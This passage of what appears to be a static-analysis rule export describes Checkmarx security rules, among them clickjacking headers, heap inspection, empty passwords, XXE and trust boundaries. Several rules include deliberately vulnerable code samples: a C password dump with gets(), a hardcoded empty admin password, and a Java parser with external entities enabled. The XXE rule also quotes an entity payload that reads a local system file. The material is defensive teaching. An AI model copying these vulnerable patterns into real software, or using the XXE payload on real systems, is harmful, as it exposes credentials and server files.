&lt;p class="MsoListParagraphCxSpFirst" dir="LTR" style="margin: 0cm 0cm 8pt 36pt; text-indent: -18pt; direction: ltr; unicode-bidi: embed;"&gt;&lt;!-- [if !supportLists]--&gt;&lt;span style="font-family: Symbol; mso-fareast-font-family: Symbol; mso-bidi-font-family: Symbol;"&gt;&amp;middot;&lt;span style="font-variant-numeric: normal; font-stretch: normal; font-size: 7pt; line-height: normal; font-family: 'Times New Roman';"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;/span&gt;&lt;/span&gt;&lt;!--[endif]--&gt;"X-Frame-Options: DENY" will indicate to the browser to disallow&amp;nbsp;embedding any web-page inside a frame, including the current web-site.&lt;/p&gt;
&lt;p class="MsoListParagraphCxSpMiddle" dir="LTR" style="margin: 0cm 0cm 8pt 36pt; text-indent: -18pt; direction: ltr; unicode-bidi: embed;"&gt;&lt;!-- [if !supportLists]--&gt;&lt;span style="font-family: Symbol; mso-fareast-font-family: Symbol; mso-bidi-font-family: Symbol;"&gt;&amp;middot;&lt;span style="font-variant-numeric: normal; font-stretch: normal; font-size: 7pt; line-height: normal; font-family: 'Times New Roman';"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;/span&gt;&lt;/span&gt;&lt;!--[endif]--&gt;"X-Frame-Options: SAMEORIGIN" will indicate to the browser to disallow&amp;nbsp;embedding any web-page inside a frame,&amp;nbsp;excluding the current web-site.&lt;/p&gt;
&lt;p class="MsoListParagraphCxSpLast" dir="LTR" style="margin: 0cm 0cm 8pt 36pt; text-indent: -18pt; direction: ltr; unicode-bidi: embed;"&gt;&lt;!-- [if !supportLists]--&gt;&lt;span style="font-family: Symbol; mso-fareast-font-family: Symbol; mso-bidi-font-family: Symbol;"&gt;&amp;middot;&lt;span style="font-variant-numeric: normal; font-stretch: normal; font-size: 7pt; line-height: normal; font-family: 'Times New Roman';"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;/span&gt;&lt;/span&gt;&lt;!--[endif]--&gt;"X-Frame-Options: ALLOW-FROM https://example.com/" will indicate to the browser to disallow embedding any web-page inside a frame,&amp;nbsp;excluding&amp;nbsp;the web-site listed after the ALLOW-FROM parameter.&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Source Code Examples&lt;/h2&gt;&lt;h3&gt;Java&lt;/h3&gt;&lt;h4&gt;Setting the "DENY" Flag on a Response&lt;/h4&gt;&lt;pre&gt;response.addHeader("X-Frame-Options", "DENY");&lt;/pre&gt;&lt;div style="display:none"&gt;]]&lt;/div&gt;</description><severity>MAJOR</severity><tag>checkmarx-medium</tag><type>VULNERABILITY</type></rule><rule><key>checkmarx_3771</key><name>Heap_Inspection</name><description>&lt;div style="display:none"&gt;![CDATA[&lt;/div&gt;&lt;h2&gt;Risk&lt;/h2&gt;&lt;h4&gt;What might happen&lt;/h4&gt;&lt;p&gt;&lt;div&gt;All variables stored by the application in unencrypted memory can potentially be retrieved by an unauthorized user, with privlieged access to the&amp;#160;machine. For example, a privileged attacker could attach a debugger to the running process, or retrieve the process's memory from the swapfile or crash dump file.&amp;#160;&lt;/div&gt;
&lt;div&gt;Once the attacker&amp;#160;finds the user passwords in memory, these can be reused to easily impersonate the user to the system.&amp;#160;&lt;/div&gt;      
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Cause&lt;/h2&gt;&lt;h4&gt;How does it happen&lt;/h4&gt;&lt;p&gt;&lt;div&gt;String variables are immutable - in other words, once a string variable is assigned, its value cannot be changed or removed. Thus, these strings may remain&amp;#160;around in memory, possibly in multiple locations, for an indefinite period of time until the garbage collector happens to remove it. Sensitive data, such as passwords, will remain exposed in memory as plaintext with no control over their lifetime.&amp;#160;&lt;/div&gt;      
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;General Recommendations&lt;/h2&gt;&lt;h4&gt;How to avoid it&lt;/h4&gt;&lt;p&gt;&lt;div&gt;Generic Guidance:&lt;/div&gt;
&lt;div&gt;
&lt;ul&gt;
&lt;ul&gt;
&lt;li&gt;Do not store senstiive data, such as passwords or encryption keys, in memory in plaintext, even for a short period of time.&amp;#160;&lt;/li&gt;
&lt;li&gt;Prefer to use specialized classes that store&amp;#160;encrypted memory.&amp;#160;&lt;/li&gt;
&lt;li&gt;Alternatively, store secrets temporarily in mutable data types, such as byte arrays, and then promptly zeroize the&amp;#160;memory locations.&amp;#160;&lt;/li&gt;
&lt;/ul&gt;
&lt;/ul&gt;
&lt;/div&gt;
&lt;div&gt;Specific Recommendations - Java:&lt;/div&gt;
&lt;div&gt;
&lt;ul&gt;
&lt;ul&gt;
&lt;li&gt;Instead of storing passwords in immutable strings, prefer to use an encrypted memory&amp;#160;object, such as SealedObject. &amp;#160;&lt;/li&gt;
&lt;/ul&gt;
&lt;/ul&gt;
&lt;div&gt;
&lt;div&gt;Specific Recommendations - .NET:&lt;/div&gt;
&lt;div&gt;
&lt;ul&gt;
&lt;ul&gt;
&lt;li&gt;Instead of storing passwords in immutable strings, prefer to use an encrypted memory&amp;#160;object, such as&amp;#160;SecureString or ProtectedData.&lt;/li&gt;
&lt;/ul&gt;
&lt;/ul&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;      
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Source Code Examples&lt;/h2&gt;&lt;h3&gt;Java&lt;/h3&gt;&lt;h4&gt;Plaintext Password in Immutable String&lt;/h4&gt;&lt;pre&gt;
class Heap_Inspection 
{
  private string password;
	
  void setPassword()
  {	
	password = System.console().readLine("Enter your password: ");
  }
}
&lt;/pre&gt;&lt;h4&gt;Password Protected in Memory&lt;/h4&gt;&lt;pre&gt;class Heap_Inspection_Fixed 
{
  private SealedObject password;
	
  void setPassword()
  {	
	byte[] sKey = getKeyFromConfig();
	Cipher c = Cipher.getInstance("AES");
	c.init(Cipher.ENCRYPT_MODE, sKey);

	char[] input = System.console().readPassword("Enter your password: ");
	password = new SealedObject(Arrays.asList(input), c);
  }
}

&lt;/pre&gt;&lt;h3&gt;CPP&lt;/h3&gt;&lt;h4&gt;Vulnerable C code&lt;/h4&gt;&lt;pre&gt;/* Vulnerable to heap inspection */

#include &lt;stdio.h&gt;


void somefunc(){
	printf("Yea, I'm just being called for the heap of it..\n");
}

void authfunc(){
        char* password = (char *) malloc(256);
        char ch;
        ssize_t k;
		int i=0;
        while(k = read(0, &amp;ch, 1) &gt; 0)
        {
                if (ch == '\n'){
                        password[i]='\0';
                        break;
                } else{
                        password[i++]=ch;
                        fflush(0);
                }
        }
        printf("Password: %s\n",&amp;password[0]);
}

int main()
{
    printf("Please enter a password:\n");

	authfunc();
	printf("You can now dump memory to find this password!");
	somefunc();
	gets();

}
&lt;/pre&gt;&lt;h4&gt;Safe C code&lt;/h4&gt;&lt;pre&gt;/* Pesumably safe heap */

#include &lt;stdio.h&gt;
#include &lt;string.h&gt;

#define STDIN_FILENO 0

void somefunc(){
        printf("Yea, I'm just being called for the heap of it..\n");
}

void authfunc(){
	char* password = (char*) malloc(256);
	int i=0;
	char ch;
	ssize_t k;
	while(k = read(STDIN_FILENO, &amp;ch, 1) &gt; 0)
	{
		if (ch == '\n'){
			password[i]='\0';
			break;
		} else{
			password[i++]=ch;
			fflush(0);
		}
	}
	i=0;
	memset(password,'\0',256);
}

int main()
{
	printf("Please enter a password:\n");
	authfunc();
	somefunc();
	char ch;
	while(read(STDIN_FILENO, &amp;ch, 1) &gt; 0)
	{
		if (ch == '\n')
			break;
	}
}
&lt;/pre&gt;&lt;div style="display:none"&gt;]]&lt;/div&gt;</description><severity>MAJOR</severity><tag>checkmarx-medium</tag><type>VULNERABILITY</type></rule><rule><key>checkmarx_3461</key><name>Empty_Password_In_Connection_String</name><description>&lt;div style="display:none"&gt;![CDATA[&lt;/div&gt;&lt;h2&gt;Risk&lt;/h2&gt;&lt;h4&gt;What might happen&lt;/h4&gt;&lt;p&gt;&lt;p&gt;For services that allow an empty password, an empty password would be the first guess an attacker would make. Failure to ensure robust authentication criteria can expose sensitive services, information and systems to compromise with minimal effort.&lt;/p&gt;
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Cause&lt;/h2&gt;&lt;h4&gt;How does it happen&lt;/h4&gt;&lt;p&gt;&lt;p&gt;The set password is empty, indicating that it is both hardcoded into the application, and can be easily guessed by anyone attempting to access the account&amp;nbsp;this password belongs to.&lt;/p&gt;
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;General Recommendations&lt;/h2&gt;&lt;h4&gt;How to avoid it&lt;/h4&gt;&lt;p&gt;&lt;ul style="box-sizing: border-box; margin-top: 0px; margin-bottom: 10px; color: rgba(0, 0, 0, 0.870588); font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif; font-size: 18px;"&gt;
&lt;li style="box-sizing: border-box;"&gt;Disallow use of an empty password to any accounts for accessing systems, services or information, both by policy and by technical means available.&lt;/li&gt;
&lt;li style="box-sizing: border-box;"&gt;Do not hardcode any secret data in source code, especially not passwords.&amp;nbsp;&lt;/li&gt;
&lt;li style="box-sizing: border-box;"&gt;In particular, user passwords should be stored in a&amp;nbsp;database or directory service, and protected with a strong password hash (e.g. bcrypt, scrypt, PBKDF2, or Argon2). Do not compare user passwords with a hardcoded value.&amp;nbsp;&lt;/li&gt;
&lt;li style="box-sizing: border-box;"&gt;Sytem passwords should be stored in a configuration file or the database, and protected with strong encryption (e.g. AES-256). Encryption keys should be securely managed, and not hardcoded.&amp;nbsp;&lt;/li&gt;
&lt;/ul&gt;
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Source Code Examples&lt;/h2&gt;&lt;h3&gt;Java&lt;/h3&gt;&lt;h4&gt;No Empty Credentials&lt;/h4&gt;&lt;pre&gt;bool isAdmin(String username, String password) {
    bool adminPrivs = false;
    if (authenticateUser(username, password)) { 
        UserPrivileges privs = getUserPrivilieges(username);
        if (privs.isAdmin)
            adminPrivs = true;
    }
    return adminPrivs;
}&lt;/pre&gt;&lt;h4&gt;Hardcoded Empty Password Constant&lt;/h4&gt;&lt;pre&gt;const String DB_PASSWORD="";&lt;/pre&gt;&lt;h4&gt;Inline Hardcoded Empty Password&lt;/h4&gt;&lt;pre&gt;bool isAdmin(String username, String password) {
    bool isMatch = false; 
    
    if (username.equals("admin")) {
        if (password.equals(""))
            return isMatch = true;
    }
    
    return isMatch;
}&lt;/pre&gt;&lt;div style="display:none"&gt;]]&lt;/div&gt;</description><severity>MINOR</severity><tag>checkmarx-low</tag><type>VULNERABILITY</type></rule><rule><key>checkmarx_3591</key><name>Portability_Flaw_In_File_Separator</name><description>&lt;div style="display:none"&gt;![CDATA[&lt;/div&gt;&lt;html xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"&gt;
	&lt;link href="main.css" rel="stylesheet" type="text/css"&gt;
&lt;div id="CWEDefinition"&gt;&lt;div class="title"&gt;&lt;table cellpadding="0" cellspacing="0" border="0" width="100%"&gt;&lt;tr&gt;&lt;td valign="top" width="20px"&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div align="center"&gt;&lt;span style="font-weight:bold;color:white;"&gt;Use of Function with Inconsistent Implementations&lt;/span&gt;&lt;/div&gt;&lt;/td&gt;&lt;td valign="top" width="20px"&gt;&lt;div class="left noprint"&gt;

&lt;span class="tool"&gt;&lt;/span&gt;

&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;div class="status"&gt;&lt;table width="100%" border="0" cellpadding="0" cellspacing="0"&gt;&lt;tr&gt;&lt;td valign="top" align="left" width="33%" nowrap=""&gt;&lt;b&gt;Weakness ID: &lt;/b&gt;474&lt;span style="font-style:italic; font-size:80%"&gt; (Weakness Base)&lt;/span&gt;&lt;/td&gt;&lt;td valign="top" align="center" nowrap=""&gt;&lt;/td&gt;&lt;td valign="top" align="right" nowrap=""&gt;&lt;b&gt;Status: &lt;/b&gt;&lt;span class="Draft"&gt;Draft&lt;/span&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;div id="Description"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Description&lt;/div&gt;&lt;div name="oc_474_Description" id="oc_474_Description" class="expandblock"&gt;&lt;div class="detail"&gt;
&lt;p class="subheading"&gt;Description Summary&lt;/p&gt;&lt;div class="indent"&gt;The code uses a function that has inconsistent implementations
across operating systems and versions, which might cause security-relevant
portability problems.&lt;/div&gt;
&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Time of Introduction"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Time of Introduction&lt;/div&gt;&lt;div name="oc_474_Time of Introduction" id="oc_474_Time of Introduction" class="expandblock"&gt;&lt;div class="detail"&gt;&lt;ul&gt;
&lt;li&gt;Architecture and Design&lt;/li&gt;
&lt;li&gt;Implementation&lt;/li&gt;
&lt;/ul&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Applicable Platforms"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Applicable Platforms&lt;/div&gt;&lt;div name="oc_474_Applicable Platforms" id="oc_474_Applicable Platforms" class="expandblock"&gt;&lt;div class="detail"&gt;
&lt;p class="subheading"&gt;Languages&lt;/p&gt;&lt;div class="indent"&gt;
&lt;p&gt;C: &lt;span class="smaller" style="font-style:italic"&gt;(Often)&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;PHP: &lt;span class="smaller" style="font-style:italic"&gt;(Often)&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;All&lt;/p&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Potential Mitigations"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Potential Mitigations&lt;/div&gt;&lt;div name="oc_474_Potential Mitigations" id="oc_474_Potential Mitigations" class="expandblock"&gt;&lt;div class="detail"&gt;&lt;div id="Grouped"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;
&lt;tr&gt;&lt;td valign="top"&gt;&lt;p&gt;Do not accept inconsistent behavior from the API specifications when
the deviant behavior increase the risk level.&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Other Notes"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Other Notes&lt;/div&gt;&lt;div name="oc_474_Other Notes" id="oc_474_Other Notes" class="expandblock"&gt;&lt;div class="detail"&gt;&lt;div id="Grouped"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;
&lt;tr&gt;&lt;td&gt;
&lt;p&gt;The behavior of functions in this category varies by operating system, and
at times, even by operating system version. Implementation differences can
include:&lt;/p&gt;
&lt;div class="indent "&gt;
&lt;p&gt;- Slight differences in the way parameters are interpreted leading to
inconsistent results.&lt;/p&gt;
&lt;p&gt;- Some implementations of the function carry significant security
risks.&lt;/p&gt;
&lt;p&gt;- The function might not be defined on all platforms.&lt;/p&gt;
&lt;/div&gt;
&lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Relationships"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Relationships&lt;/div&gt;&lt;div name="oc_474_Relationships" id="oc_474_Relationships" class="expandblock"&gt;&lt;div class="tabledetail"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" id="Detail"&gt;&lt;tr&gt;&lt;th valign="top"&gt;Nature&lt;/th&gt;&lt;th valign="top"&gt;Type&lt;/th&gt;&lt;th valign="top"&gt;ID&lt;/th&gt;&lt;th valign="top" width="100%"&gt;Name&lt;/th&gt;&lt;th valign="middle" class="left" style="text-align:center"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;View(s) this relationship pertains to&lt;/span&gt;&lt;/span&gt;&lt;/th&gt;&lt;/tr&gt;
&lt;tbody&gt;&lt;tr class="primary"&gt;&lt;td valign="top"&gt;ChildOf&lt;/td&gt;&lt;td valign="top" nowrap="" class="right" align="center" style="padding-top:1px"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Weakness Class&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;398&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=398" target="_blank"&gt;Indicator of Poor Code Quality&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Development Concepts &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;699&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Seven Pernicious Kingdoms &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;700&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Research Concepts &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;1000&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;
&lt;tbody&gt;&lt;tr class="foreign"&gt;&lt;td valign="top"&gt;ParentOf&lt;/td&gt;&lt;td valign="middle" nowrap="" class="right" align="center"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Weakness Variant&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;589&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=589" target="_blank"&gt;Call to Non-ubiquitous API&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Research Concepts &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;1000&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;
&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Taxonomy Mappings"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Taxonomy Mappings&lt;/div&gt;&lt;div name="oc_474_Taxonomy Mappings" id="oc_474_Taxonomy Mappings" class="expandblock"&gt;&lt;div class="tabledetail"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;&lt;tr&gt;&lt;th valign="top" nowrap=""&gt;Mapped Taxonomy Name&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Node ID&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Fit&lt;/th&gt;&lt;th valign="top" width="100%"&gt;Mapped Node Name&lt;/th&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top"&gt;7 Pernicious Kingdoms&lt;/td&gt;&lt;td valign="top"&gt;&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;&lt;/td&gt;&lt;td valign="top"&gt;Inconsistent Implementations&lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Content History"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Content History&lt;/div&gt;&lt;div name="oc_474_Content History" id="oc_474_Content History" class="expandblock"&gt;&lt;div class="tabledetail"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;&lt;tr&gt;&lt;th valign="top" colspan="5" class="title"&gt;Submissions&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;th valign="top" nowrap=""&gt;Submission Date&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Submitter&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Organization&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Source&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;7 Pernicious Kingdoms&lt;/td&gt;&lt;td valign="top"&gt;&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Externally Mined&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;th valign="top" colspan="5" class="title"&gt;Modifications&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;th valign="top" nowrap=""&gt;Modification Date&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Modifier&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Organization&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Source&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;2008-07-01&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Eric Dalci&lt;/td&gt;&lt;td valign="top"&gt;Cigital&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;External&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;updated Potential Mitigations,
Time of Introduction&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;2008-09-08&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;CWE Content Team&lt;/td&gt;&lt;td valign="top"&gt;MITRE&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Internal&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;updated Applicable Platforms, Relationships, Other Notes,
Taxonomy Mappings&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;th valign="top" colspan="5" class="title"&gt;Previous Entry Names&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;th valign="top" nowrap=""&gt;Change Date&lt;/th&gt;&lt;th valign="top" nowrap="" colspan="3"&gt;Previous Entry
Name&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;2008-04-11&lt;/td&gt;&lt;td valign="top" colspan="3"&gt;Inconsistent
Implementations&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="border-bottom:1px solid #BAC5E3" colspan="4"&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;

&lt;/html&gt;

&lt;div align="right" style="padding-top:5px; padding-bottom:5px; clear:right" class="noprint"&gt;&lt;a class="backtop" href="#top"&gt;Back to top&lt;/a&gt;&lt;/div&gt;

&lt;html xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"&gt;&lt;/html&gt;&lt;div style="display:none"&gt;]]&lt;/div&gt;</description><severity>MINOR</severity><tag>checkmarx-low</tag><type>VULNERABILITY</type></rule><rule><key>checkmarx_4447</key><name>Improper_Restriction_of_Stored_XXE_Ref</name><description>&lt;div style="display:none"&gt;![CDATA[&lt;/div&gt;&lt;h2&gt;Risk&lt;/h2&gt;&lt;h4&gt;What might happen&lt;/h4&gt;&lt;p&gt;&lt;div&gt;An&amp;#160;application that will parse and replace DTD entity references in an untrusted, arbitrary XML document, can allow an attacker to craft an XML document to read arbitrary server files, and load it into the database. This XML document could contain an XML entity reference, which refers to an embedded DTD entity definition that points to any local file. This would enable the attacker to retrieve any arbitrary system file on the server.&lt;/div&gt;      
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Cause&lt;/h2&gt;&lt;h4&gt;How does it happen&lt;/h4&gt;&lt;p&gt;&lt;div&gt;
&lt;div&gt;An attacker could save&amp;#160;to the application database&amp;#160;an XML document (or a document fragment) that contains a DTD declaration. In particular, this document would contain an entity defintion that refers to a local file on the server's disk, e.g.&amp;#160;&lt;code&gt;&amp;lt;!ENTITY xxe SYSTEM "file:///c:/boot.ini"&amp;gt;&lt;/code&gt;. The attacker would then include an XML entity reference that refers back to that entity definition, e.g.&amp;#160;&lt;code&gt;&amp;lt;div&amp;gt;&amp;amp;xxe;&amp;lt;/div&amp;gt;&lt;/code&gt;&amp;#160;.&lt;/div&gt;
&lt;div&gt;Later, the application will read this document from the database, and read and parse it as XML. This will automatically resolve the entity value to a file, and embed it's contents directly into the loaded XML document.&amp;#160;If this fully loaded XML document is then returned to the user, the result would&amp;#160;include the contents of the sensitive system file.&amp;#160;&lt;/div&gt;
&lt;div&gt;This is caused by the XML parser, which is configured to automatically parse DTD declarations and resolve entity references, instead of disabling both DTD and external references altogether.&amp;#160;&lt;/div&gt;
&lt;/div&gt;      
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;General Recommendations&lt;/h2&gt;&lt;h4&gt;How to avoid it&lt;/h4&gt;&lt;p&gt;&lt;div&gt;Generic Guidance&lt;/div&gt;
&lt;div&gt;
&lt;ul&gt;
&lt;li&gt;Always validate all data, regardless of source.&amp;#160;&lt;/li&gt;
&lt;li&gt;Do not automatically process untrusted data without validation, even from the internal database or server file.&amp;#160;&lt;/li&gt;
&lt;li&gt;When loading XML from the untrusted data, ensure the XML parser is restricted and constrained.&amp;#160;&lt;/li&gt;
&lt;li&gt;In particular, disable DTD parsing and resolving of entities. Apply a strict XML schema on the server, and validate the input XML accordingly.&amp;#160;&lt;/li&gt;
&lt;/ul&gt;
&lt;/div&gt;
&lt;div&gt;Specific Recommendations&lt;/div&gt;
&lt;div&gt;
&lt;ul&gt;
&lt;li&gt;Use safe XML parsers, and disable DTD parsing and entity resolving.&amp;#160;&lt;/li&gt;
&lt;li&gt;Do not enable DTD parsing or entity resolving.&amp;#160;&lt;/li&gt;
&lt;/ul&gt;
&lt;/div&gt;      
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Source Code Examples&lt;/h2&gt;&lt;h3&gt;Java&lt;/h3&gt;&lt;h4&gt;Loading XML from Database with XMLStreamReader&lt;/h4&gt;&lt;pre&gt;String loadXML(ResultSet rs) {
    StringBuilder content = new StringBuilder();
    
    XMLInputFactory factory = XMLInputFactory.newFactory(); 
    factory.setProperty(XMLInputFactory.IS_SUPPORTING_EXTERNAL_ENTITIES, true);
    factory.setProperty(XMLInputFactory.SUPPORT_DTD, true); 
    
    StringReader document = new StringReader(rs.getString("xmlDocument"));
    XMLStreamReader reader = factory.createXMLStreamReader(document);
    
    while(reader.hasNext())
    {
        if(reader.hasText()
        {
            content.append(reader.getText());
        }
        reader.next();
    }
    
    return content.toString();
}
&lt;/pre&gt;&lt;h4&gt;Disabling DTD Entities with XMLStreamReader&lt;/h4&gt;&lt;pre&gt;String loadXML(ResultSet rs) {
    StringBuilder content = new StringBuilder();
    
    XMLInputFactory factory = XMLInputFactory.newFactory(); 
    factory.setProperty(XMLInputFactory.IS_SUPPORTING_EXTERNAL_ENTITIES, false);
    factory.setProperty(XMLInputFactory.SUPPORT_DTD, false); 
    
    StringReader document = new StringReader(rs.getString("xmlDocument"));
    XMLStreamReader reader = factory.createXMLStreamReader(document);
    
    while(reader.hasNext())
    {
        if(reader.hasText()
        {
            content.append(reader.getText());
        }
        reader.next();
    }
    
    return content.toString();
}
&lt;/pre&gt;&lt;div style="display:none"&gt;]]&lt;/div&gt;</description><severity>MAJOR</severity><tag>checkmarx-medium</tag><type>VULNERABILITY</type></rule><rule><key>checkmarx_646</key><name>Trust_Boundary_Violation</name><description>&lt;div style="display:none"&gt;![CDATA[&lt;/div&gt;&lt;h2&gt;Risk&lt;/h2&gt;&lt;h4&gt;What might happen&lt;/h4&gt;&lt;p&gt;&lt;div&gt;Application developers may treat user input as trusted data, potentially creating an input-based vulnerability such as SQL Injection or Cross-Site Scripting.&lt;/div&gt;      
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Cause&lt;/h2&gt;&lt;h4&gt;How does it happen&lt;/h4&gt;&lt;p&gt;&lt;div&gt;The application places user input, which is untrusted data, in the server-side Session folder, which is considered a trusted location. This could lead developers to treat untrusted data as trusted.&lt;/div&gt;      
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;General Recommendations&lt;/h2&gt;&lt;h4&gt;How to avoid it&lt;/h4&gt;&lt;p&gt;&lt;div&gt;
&lt;ol&gt;
&lt;li&gt;Validate and sanitize all input, regardless of source. Validation should be based on a whitelist: accept only data fitting a specified structure, rather than reject bad patterns. Check for:&lt;/li&gt;
&lt;ul&gt;
&lt;li&gt;Data type&lt;/li&gt;
&lt;li&gt;Size&lt;/li&gt;
&lt;li&gt;Range&lt;/li&gt;
&lt;li&gt;Format&lt;/li&gt;
&lt;li&gt;Expected values&lt;/li&gt;
&lt;/ul&gt;
&lt;li&gt;Don&amp;#8217;t mix untrusted user input with trusted data.&lt;/li&gt;
&lt;/ol&gt;
&lt;/div&gt;      
